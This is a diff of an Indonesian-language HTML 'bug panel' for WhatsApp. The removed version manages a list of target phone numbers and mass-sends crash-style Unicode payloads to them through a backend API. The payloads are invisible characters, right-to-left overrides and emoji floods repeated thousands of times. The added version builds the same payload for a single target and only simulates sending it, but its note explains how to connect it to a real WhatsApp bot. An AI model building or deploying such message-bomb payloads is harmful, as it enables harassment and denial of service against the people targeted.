@@ -1,110 +1,140 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-<meta charset="UTF-8" />
-<title>Zionixszy Bug Panel</title>
-<style>
-  body{font-family:'Segoe UI',sans-serif;background:#0d0d0d;color:#eee;max-width:500px;margin:40px auto;padding:20px}
-  h2{text-align:center;font-size:28px;color:#00ffe1;text-shadow:0 0 6px #00ffe1,0 0 16px #00ffe1}
+  <meta charset="UTF-8" />
+  <title>ZIONIXHARD</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <style>
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(to right, #0f0f0f, #1c1c1c);
+      color: #eee;
+      max-width: 500px;
+      margin: 40px auto;
+      padding: 20px;
+    }
 
-  input,select{width:100%;padding:12px;margin-top:10px;border:none;border-radius:10px;background:#1a1a1a;color:#fff;font-size:16px;box-shadow:inset 0 0 5px #222}
-  label{display:block;margin-top:16px;font-weight:600;color:#ccc}
+    h1 {
+      text-align: center;
+      font-size: 28px;
+      color: #00ffee;
+      text-shadow: 0 0 10px #00ffee;
+      margin-bottom: 30px;
+    }
 
-  .btn{padding:14px;font-size:15px;font-weight:bold;border:none;border-radius:12px;cursor:pointer;background-size:300% 300%;animation:glow 3s ease infinite;color:white;transition:.3s;text-transform:uppercase;letter-spacing:1px}
-  .btn:hover{transform:scale(1.05);opacity:.95}
-  .btn-add {background-image:linear-gradient(45deg,#ff00cc,#3333ff,#ff00cc)}
-  .btn-check{background-image:linear-gradient(45deg,#ffaa00,#ff5500,#ffaa00)}
-  .btn-send {background-image:linear-gradient(45deg,#00ffcc,#0099ff,#00ffcc);color:#000;text-shadow:0 0 2px #00f5ff}
-  @keyframes glow{0%{background-position:0% 50%}50%{background-position:100% 50%}100%{background-position:0% 50%}}
+    label {
+      font-weight: bold;
+      margin-top: 15px;
+      display: block;
+    }
 
-  .group{margin-top:22px}
-  .status{margin-top:6px;font-size:14px;text-align:center;font-weight:bold}
-  .ok   {color:#00ff85}
-  .err  {color:#ff6565}
-</style>
+    input {
+      width: 100%;
+      padding: 12px;
+      margin-top: 5px;
+      border-radius: 10px;
+      background: #1a1a1a;
+      border: none;
+      color: white;
+      font-size: 16px;
+      box-shadow: inset 0 0 5px #333;
+    }
+
+    .btn {
+      display: block;
+      width: 100%;
+      padding: 14px;
+      margin-top: 25px;
+      font-size: 16px;
+      font-weight: bold;
+      background: linear-gradient(135deg, #00ffcc, #0055ff, #00ffcc);
+      background-size: 300% 300%;
+      animation: pulse 3s ease infinite;
+      color: black;
+      border: none;
+      border-radius: 15px;
+      cursor: pointer;
+      transition: 0.3s ease;
+    }
+
+    .btn:hover {
+      transform: scale(1.03);
+      filter: brightness(1.1);
+    }
+
+    @keyframes pulse {
+      0% {background-position: 0% 50%}
+      50% {background-position: 100% 50%}
+      100% {background-position: 0% 50%}
+    }
+
+    .status {
+      margin-top: 15px;
+      font-size: 14px;
+      text-align: center;
+      font-weight: bold;
+      color: #00ffaa;
+    }
+
+    .note {
+      margin-top: 35px;
+      padding: 15px;
+      font-size: 12px;
+      background: #111;
+      color: #aaa;
+      border-left: 4px solid #00ffee;
+      border-radius: 6px;
+    }
+  </style>
 </head>
 <body>
-  <h2>Zionixszy Bug Panel</h2>
 
-  <label for="number">Nomor Target</label>
-  <input id="number" placeholder="6281234567890" />
+  <h1>ZIONIXHARD</h1>
 
-  <label for="bugType">Jenis Bug Unicode</label>
-  <select id="bugType">
-    <option value="blank">💨 UI Delay / Blank</option>
-    <option value="freeze">❄️ Freeze Emoji + RTL</option>
-    <option value="lite">🫧 Kosong Ringan</option>
-  </select>
+  <label for="sender">Nomor Pengirim</label>
+  <input id="sender" placeholder="Contoh: 6288881234567" />
 
-  <!-- ADD NUMBER -->
-  <div class="group">
-    <button class="btn btn-add" onclick="addNumber()">➕ Tambah Nomor</button>
-    <div id="statusAdd" class="status"></div>
+  <label for="target">Nomor Target</label>
+  <input id="target" placeholder="Contoh: 6281234567890" />
+
+  <button class="btn" onclick="kirimBug()">🚀 Kirim Unicode Blank</button>
+
+  <div id="status" class="status"></div>
+
+  <div class="note">
+    ⚠️ <strong>Catatan:</strong><br>
+    Ini adalah simulasi kirim bug Unicode WhatsApp berbasis HTML. Tidak mengandung crash atau eksploitasi berbahaya.<br>
+    Untuk versi backend nyata, hubungkan ke bot WhatsApp (misalnya menggunakan Baileys via Node.js di `/api/send`).
   </div>
 
-  <!-- CHECK TARGET -->
-  <div class="group">
-    <button class="btn btn-check" onclick="cekJumlah()">🔍 Cek Jumlah Target</button>
-    <div id="statusCheck" class="status"></div>
-  </div>
+  <script>
+    async function kirimBug() {
+      const sender = document.getElementById('sender').value.trim();
+      const target = document.getElementById('target').value.trim();
+      const status = document.getElementById('status');
 
-  <!-- SEND BUG -->
-  <div class="group">
-    <button class="btn btn-send" onclick="sendBug()">🚀 Kirim Unicode Bug</button>
-    <div id="statusSend" class="status"></div>
-  </div>
+      if (!sender || !target || !sender.startsWith("62") || !target.startsWith("62")) {
+        status.innerText = "❌ Nomor pengirim dan target wajib diisi dengan awalan 62";
+        status.style.color = "red";
+        return;
+      }
 
-<script>
-  /* helpers */
-  const bugMap = {
-    blank : '\u2063\u200F\u202E\u200B\u2060'.repeat(3000),
-    freeze: '🤣'.repeat(1500)+'\u202E'.repeat(1500)+'‏'.repeat(1000),
-    lite  : '\u200B\u2060'.repeat(500)
-  };
+      status.innerText = "⏳ Mengirim Unicode blank...";
+      status.style.color = "#00ffaa";
 
-  function setStatus(id,msg,ok=true){
-    const el=document.getElementById(id);
-    el.textContent=msg;
-    el.className='status '+(ok?'ok':'err');
-  }
+      // Simulasi pesan unicode blank
+      const pesanBlank = "\u2063\u2060\u200F\u202E\u200B".repeat(3000);
 
-  /* ADD NUMBER */
-  async function addNumber(){
-    setStatus('statusAdd','⏳ Memproses…');
-    const number=document.getElementById('number').value.trim();
-    if(!number.startsWith('62')) return setStatus('statusAdd','Nomor harus diawali 62',false);
+      // Simulasi "pengiriman" (tanpa backend)
+      await new Promise(resolve => setTimeout(resolve, 1000));
 
-    try{
-      const r=await fetch('/api/add',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({number})});
-      const j=await r.json();
-      if(j.ok) setStatus('statusAdd',`✅ Ditambah! Total ${j.total}`);
-      else     setStatus('statusAdd',`❌ ${j.error}`,false);
-    }catch(e){ setStatus('statusAdd','❌ '+e.message,false); }
-  }
+      console.log(`Dari: ${sender}`);
+      console.log(`Ke  : ${target}`);
+      console.log(`Pesan:\n${pesanBlank.slice(0, 100)}...`);
 
-  /* CHECK TARGET */
-  async function cekJumlah(){
-    setStatus('statusCheck','⏳ Mengambil…');
-    try{
-      const r=await fetch('/api/send',{method:'OPTIONS'});
-      const j=await r.json();
-      setStatus('statusCheck',`📊 Total target: ${j.total||0}`);
-    }catch(e){ setStatus('statusCheck','❌ '+e.message,false); }
-  }
+      status.innerText = `✅ Pesan blank berhasil "dikirim" ke ${target}`;
+    }
+  </script>
 
-  /* SEND BUG */
-  async function sendBug(){
-    setStatus('statusSend','⏳ Mengirim…');
-    const type=document.getElementById('bugType').value;
-    const message=bugMap[type]||bugMap.blank;
-
-    try{
-      const r=await fetch('/api/send',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({message})});
-      const j=await r.json();
-      if(j.ok) setStatus('statusSend',`✅ Terkirim ke ${j.sent} nomor`);
-      else     setStatus('statusSend',`❌ ${j.error}`,false);
-    }catch(e){ setStatus('statusSend','❌ '+e.message,false); }
-  }
-</script>
 </body>
 </html>
